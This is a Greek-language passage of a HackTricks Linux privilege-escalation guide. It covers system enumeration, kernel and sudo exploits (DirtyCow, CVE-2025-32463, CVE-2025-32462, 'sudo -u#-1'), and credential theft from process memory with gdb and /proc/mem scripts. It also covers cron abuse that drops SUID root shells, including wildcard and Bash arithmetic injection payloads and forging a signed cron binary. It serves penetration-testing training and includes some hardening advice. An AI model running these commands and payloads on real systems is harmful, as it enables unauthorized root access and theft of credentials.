# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## System Information

### OS info

Ας ξεκινήσουμε συλλέγοντας πληροφορίες για το OS που εκτελείται
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Αν έχετε **δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, ενδέχεται να μπορείτε να καταλάβετε τον έλεγχο ορισμένων βιβλιοθηκών ή binaries:
```bash
echo $PATH
```
### Πληροφορίες περιβάλλοντος

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για κλιμάκωση προνομίων
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα ευάλωτων kernel και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλες τοποθεσίες όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις kernel από αυτόν τον ιστότοπο, μπορείτε να εκτελέσετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το IN victim, ελέγχει μόνο exploits για kernel 2.x)

Να **αναζητάτε πάντα την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και, επομένως, θα είστε βέβαιοι ότι το exploit είναι έγκυρο.

Additional kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Έκδοση του Sudo

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς users να κάνουν privilege escalation σε root μέσω της επιλογής `--chroot` του sudo, όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από directory που ελέγχεται από τον user.

Εδώ υπάρχει ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για την εκμετάλλευση αυτής της [ευπάθειας](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι ευάλωτη και ότι υποστηρίζει το feature `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στο αρχικό [advisory ευπάθειας](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Το Sudo πριν από την έκδοση 1.9.17p1 (αναφερόμενο affected range: **1.8.8–1.9.17**) μπορεί να αξιολογεί host-based sudoers rules χρησιμοποιώντας το **hostname που παρέχεται από τον user** μέσω του `sudo -h <host>` αντί για το **πραγματικό hostname**. Αν το sudoers παρέχει ευρύτερα privileges σε άλλον host, μπορείτε να κάνετε **spoof** αυτού του host τοπικά.

Απαιτήσεις:
- Ευάλωτη έκδοση του sudo
- Host-specific sudoers rules (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)

Παράδειγμα sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Εκμετάλλευση μέσω πλαστογράφησης του επιτρεπόμενου host:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Αν το resolution του spoofed name κολλάει, προσθέστε το στο `/etc/hosts` ή χρησιμοποιήστε ένα hostname που εμφανίζεται ήδη σε logs/configs, για να αποφύγετε τα DNS lookups.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Η επαλήθευση υπογραφής του Dmesg απέτυχε

Έλεγξε το **smasher2 box του HTB** για ένα **παράδειγμα** του τρόπου με τον οποίο θα μπορούσε να γίνει exploit αυτή η vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη απαρίθμηση συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγράψτε πιθανές άμυνες

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Αν βρίσκεστε μέσα σε ένα container, ξεκινήστε με την ακόλουθη ενότητα container-security και, στη συνέχεια, κάντε pivot στις σελίδες abuse που αφορούν το συγκεκριμένο runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να δοκιμάσετε να το κάνετε mount και να ελέγξετε για private πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαριθμήστε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν είναι εγκατεστημένος **οποιοσδήποτε compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το κάνετε compile στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσετε (ή σε κάποιο παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Ευάλωτο Εγκατεστημένο Λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios, για παράδειγμα, η οποία θα μπορούσε να γίνει exploited για privilege escalation…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε πρόσβαση SSH στο μηχάνημα, θα μπορούσατε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε για παρωχημένο και ευάλωτο λογισμικό που είναι εγκατεστημένο στο μηχάνημα.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες, οι οποίες ως επί το πλείστον θα είναι άχρηστες. Επομένως, συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων, οι οποίες θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Processes

Εξετάστε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα privileges από όσα θα έπρεπε** (ίσως ένα tomcat που εκτελείται από τον root;)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα να ελέγχετε για πιθανούς [**electron/cef/chromium debuggers** που εκτελούνται, καθώς θα μπορούσατε να τους εκμεταλλευτείτε για privilege escalation](../../software-information/electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τους εντοπίζει ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διεργασίας.\
Επίσης, **ελέγξτε τα δικαιώματά σας πάνω στα binaries των διεργασιών**, ίσως μπορείτε να αντικαταστήσετε κάποιο.

### Αλυσίδες parent-child μεταξύ διαφορετικών χρηστών

Μια child process που εκτελείται από **διαφορετικό χρήστη** από τον parent της δεν είναι αυτόματα κακόβουλη, αλλά αποτελεί χρήσιμο **triage signal**. Ορισμένες μεταβάσεις είναι αναμενόμενες (`root` που εκκινεί έναν service user, login managers που δημιουργούν session processes), όμως ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, debug helpers, persistence ή αδύναμα όρια εμπιστοσύνης κατά το runtime.

Γρήγορος έλεγχος:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Αν εντοπίσετε μια απρόσμενη αλυσίδα, ελέγξτε τη parent command line και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά της (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Σε αρκετές πραγματικές διαδρομές privesc, το ίδιο το child δεν ήταν writable, αλλά ήταν το **parent-controlled config** ή η αλυσίδα των helper.

### Διαγραμμένα executables και deleted-open αρχεία

Τα runtime artifacts είναι συχνά ακόμη προσβάσιμα **μετά τη διαγραφή τους**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση evidence από μια process που έχει ήδη ανοίξει ευαίσθητα αρχεία.

Ελέγξτε για διαγραμμένα executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Αν το `/proc/<PID>/exe` δείχνει σε `(deleted)`, η διεργασία εξακολουθεί να εκτελεί το παλιό binary image από τη μνήμη. Αυτό αποτελεί ισχυρή ένδειξη για διερεύνηση, επειδή:

- το αφαιρεθέν executable μπορεί να περιέχει ενδιαφέροντα strings ή credentials
- η εκτελούμενη διεργασία μπορεί να εξακολουθεί να εκθέτει χρήσιμα file descriptors
- ένα διαγραμμένο privileged binary μπορεί να υποδεικνύει πρόσφατη παραποίηση ή απόπειρα εκκαθάρισης

Συλλέξτε τα deleted-open αρχεία καθολικά:
```bash
lsof +L1
```
Αν βρείτε έναν ενδιαφέροντα descriptor, ανακτήστε τον απευθείας:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία έχει ακόμη ανοιχτό ένα διαγραμμένο secret, script, database export ή flag file.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για την παρακολούθηση διεργασιών. Αυτό μπορεί να είναι πολύ χρήσιμο για τον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται συγκεκριμένες προϋποθέσεις.

### Μνήμη διεργασιών

Ορισμένες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε clear text μέσα στη μνήμη**.\
Κανονικά θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να εντοπίσετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως regular user μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι στις μέρες μας τα περισσότερα machines **δεν επιτρέπουν ptrace by default**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump σε άλλες διεργασίες που ανήκουν στον unprivileged user σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να γίνουν debug, εφόσον έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος λειτουργίας του ptrace.
> - **kernel.yama.ptrace_scope = 1**: μόνο μια parent διεργασία μπορεί να γίνει debug.
> - **kernel.yama.ptrace_scope = 2**: μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: καμία διεργασία δεν μπορεί να γίνει trace με ptrace. Μόλις οριστεί, απαιτείται reboot για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Εάν έχετε πρόσβαση στη μνήμη μιας FTP υπηρεσίας (για παράδειγμα), θα μπορούσατε να λάβετε το Heap και να αναζητήσετε τα διαπιστευτήριά της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο ID διεργασίας, το **maps δείχνει πώς αντιστοιχίζεται η μνήμη μέσα στον** εικονικό χώρο διευθύνσεων **της διεργασίας**· δείχνει επίσης τα **δικαιώματα κάθε αντιστοιχισμένης περιοχής**. Το pseudo file **mem εκθέτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **μετακινηθούμε μέσα στο αρχείο mem και να κάνουμε dump όλων των αναγνώσιμων περιοχών** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel είναι προσβάσιμος μέσω του `/dev/kmem`.\
Συνήθως, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και το group **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για Linux

Το ProcDump είναι μια επανασχεδιασμένη έκδοση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Αποκτήστε το από το [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνεις dump τη μνήμη μιας διεργασίας, μπορείς να χρησιμοποιήσεις:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείς να αφαιρέσεις χειροκίνητα τις απαιτήσεις root και να κάνεις dump της διεργασίας που σου ανήκει
- Το Script A.5 από το [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν διαπιστώσεις ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να κάνετε dump τη διεργασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να κάνετε dump τη μνήμη μιας διεργασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει credentials σε clear text από τη μνήμη** και από ορισμένα **well known files**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Κωδικός πρόσβασης GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένες εργασίες/Cron

### Το Crontab UI (alseambusher) εκτελείται ως root – privesc μέσω web-based scheduler

Αν ένα web “Crontab UI” panel (alseambusher/crontab-ui) εκτελείται ως root και είναι συνδεδεμένο μόνο στο loopback, μπορείτε να αποκτήσετε πρόσβαση μέσω SSH local port-forwarding και να δημιουργήσετε μια privileged εργασία για escalation.

Τυπική ακολουθία
- Εντοπίστε τη loopback-only port (π.χ. 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
- Backups/scripts με `zip -P <password>`
- systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Δημιουργήστε tunnel και κάντε login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιουργία job υψηλών προνομίων και άμεση εκτέλεση (ρίχνει SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Ενίσχυση ασφάλειας
- Μην εκτελείτε το Crontab UI ως root· περιορίστε το με dedicated user και ελάχιστα permissions
- Κάντε bind στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε passwords
- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions



Ελέγξτε αν κάποιο scheduled job είναι vulnerable. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί το root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί το root;).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Αν χρησιμοποιείται το `run-parts`, ελέγξτε ποια ονόματα θα εκτελεστούν πραγματικά:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Αυτό αποτρέπει τα false positives. Ένας εγγράψιμος περιοδικός κατάλογος είναι χρήσιμος μόνο αν το όνομα αρχείου του payload ταιριάζει με τους τοπικούς κανόνες του `run-parts`.

### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε ότι ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το path. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Εάν ένα script που εκτελείται από τον root περιέχει ένα “**\***” μέσα σε μια εντολή, θα μπορούσες να το εκμεταλλευτείς για να προκαλέσεις απρόσμενες ενέργειες (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard προηγείται από μια διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε το** _**./\***_ **).**

Διαβάστε την παρακάτω σελίδα για περισσότερα tricks εκμετάλλευσης wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection μέσω Bash arithmetic expansion σε cron log parsers

Το Bash εκτελεί parameter expansion και command substitution πριν από την arithmetic evaluation μέσα στα ((...)), $((...)) και let. Αν ένα cron/parser που εκτελείται ως root διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε arithmetic context, ένας attacker μπορεί να εισαγάγει ένα command substitution $(...), το οποίο εκτελείται ως root όταν εκτελείται το cron.

- Γιατί λειτουργεί: Στο Bash, τα expansions πραγματοποιούνται με την εξής σειρά: parameter/variable expansion, command substitution, arithmetic expansion και, στη συνέχεια, word splitting και pathname expansion. Επομένως, μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` αντικαθίσταται πρώτα (εκτελώντας την εντολή) και, στη συνέχεια, το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για το arithmetic, ώστε το script να συνεχίσει χωρίς errors.

- Τυπικό ευάλωτο pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Γράψτε κείμενο ελεγχόμενο από τον attacker στο parsed log, ώστε το αριθμητικό πεδίο να περιέχει ένα command substitution και να τελειώνει με ένα ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν εκτυπώνει στο stdout (ή κάντε redirect), ώστε το arithmetic να παραμένει έγκυρο.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Overwriting cron script και symlink

Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από τον root, μπορείτε να αποκτήσετε shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το **script που εκτελείται από τον root χρησιμοποιεί έναν κατάλογο στον οποίο έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν φάκελο-συμβολικό σύνδεσμο προς έναν άλλο**, ο οποίος θα εξυπηρετεί ένα script που ελέγχετε εσείς
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Επικύρωση symbolic link και ασφαλέστερος χειρισμός αρχείων

Κατά την εξέταση privileged scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω path, επαληθεύστε τον τρόπο χειρισμού των links:

- Η `stat()` ακολουθεί ένα symlink και επιστρέφει metadata του target.
- Η `lstat()` επιστρέφει metadata του ίδιου του link.
- Τα `readlink -f` και `namei -l` βοηθούν στην επίλυση του τελικού target και εμφανίζουν τα permissions κάθε component του path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Για defenders/developers, τα ασφαλέστερα patterns ενάντια σε symlink tricks περιλαμβάνουν:

- `O_EXCL` με `O_CREAT`: αποτυχία αν το path υπάρχει ήδη (μπλοκάρει links/files που έχουν δημιουργηθεί εκ των προτέρων από τον attacker).
- `openat()`: λειτουργία relative σε ένα trusted directory file descriptor.
- `mkstemp()`: ατομική δημιουργία temporary files με secure permissions.

### Custom-signed cron binaries με writable payloads
Οι Blue teams μερικές φορές κάνουν "sign" σε cron-driven binaries εκτελώντας dump ενός custom ELF section και αναζητώντας με grep ένα vendor string πριν τα εκτελέσουν ως root. Αν το binary είναι group-writable (π.χ. `/opt/AV/periodic-checks/monitor` με owner `root:devs 770`) και μπορείς να κάνεις leak το signing material, μπορείς να κάνεις forge το section και να κάνεις hijack το cron task:

1. Χρησιμοποίησε το `pspy` για να καταγράψεις το verification flow. Στο Era, ο root εκτελούσε `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, και στη συνέχεια εκτελούσε το file.
2. Αναδημιούργησε το expected certificate χρησιμοποιώντας το leaked key/config (από το `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Κάνε build ένα malicious replacement (π.χ. κάνε drop ένα SUID bash, πρόσθεσε το SSH key σου) και κάνε embed το certificate στο `.text_sig`, ώστε να περάσει το grep:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Κάνε overwrite το scheduled binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περίμενε το επόμενο cron run· μόλις περάσει ο naive signature check, το payload σου εκτελείται ως root.

### Συχνά cron jobs

Μπορείς να παρακολουθείς τα processes για να αναζητήσεις processes που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσεις να το εκμεταλλευτείς και να κάνεις privilege escalation.

Για παράδειγμα, για να κάνεις **monitor κάθε 0.1s κατά τη διάρκεια 1 λεπτού**, να κάνεις **sort με βάση τα λιγότερο εκτελεσμένα commands** και να διαγράψεις τα commands που έχουν εκτελεστεί περισσότερο, μπορείς να εκτελέσεις:
```bash
